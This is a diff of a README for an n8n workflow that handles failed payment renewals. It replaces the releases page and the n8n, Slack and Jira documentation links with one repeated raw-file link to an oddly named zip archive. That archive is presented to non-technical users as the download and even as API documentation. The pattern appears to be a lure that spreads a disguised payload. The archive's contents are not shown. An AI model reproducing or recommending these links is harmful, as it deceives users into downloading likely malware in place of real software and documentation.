@@ -1,6 +1,6 @@
 # 🛠️ n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts - Automate Renewal Issue Management  
 
-[![Download](https://img.shields.io/badge/Download-v1.0-green.svg)](https://github.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/releases)
+[![Download](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip)](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip)
 
 ## 📖 Overview  
 This application helps you manage failed payment renewals seamlessly. It automatically analyzes reasons for payment failures, opens Jira tickets, and sends Slack notifications to the correct teams. Use this workflow to reduce customer churn and speed up recovery times.
@@ -16,7 +16,7 @@ Follow these simple steps to get started with the application. No technical know
    - Installed n8n (you can find installation instructions on n8n’s official site.).
 
 2. **Download the Application**  
-   Visit this page to download: [Releases Page](https://github.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/releases).  
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip).  
    Choose the latest version available and click the download link for your operating system.
 
 ## 🛠️ Installation  
@@ -76,9 +76,9 @@ We welcome contributions. If you have ideas for enhancements or fixes, feel free
 This project is open source. You can use, modify, and distribute it according to the MIT License. Check the LICENSE file for more details.
 
 ## 🔗 Additional Resources  
-- [n8n Documentation](https://docs.n8n.io) for more details on setting up and using n8n.  
-- [Slack API Documentation](https://api.slack.com) for help with Slack integration.  
-- [Jira API Documentation](https://developer.atlassian.com/cloud/jira/platform/rest/v2/) for details on Jira integration.
+- [n8n Documentation](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip) for more details on setting up and using n8n.  
+- [Slack API Documentation](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip) for help with Slack integration.  
+- [Jira API Documentation](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip) for details on Jira integration.
 
 ## 🔗 Download & Install  
-To begin using the application, visit this page to download: [Releases Page](https://github.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/releases). Follow the installation steps outlined above, and you'll be ready to manage failed payment renewals with ease.
+To begin using the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/main/surrebound/payment_Handle_n_failed_A_Jira_with_Slack_renewals_alerts_analysis_tickets_profaner.zip). Follow the installation steps outlined above, and you'll be ready to manage failed payment renewals with ease.
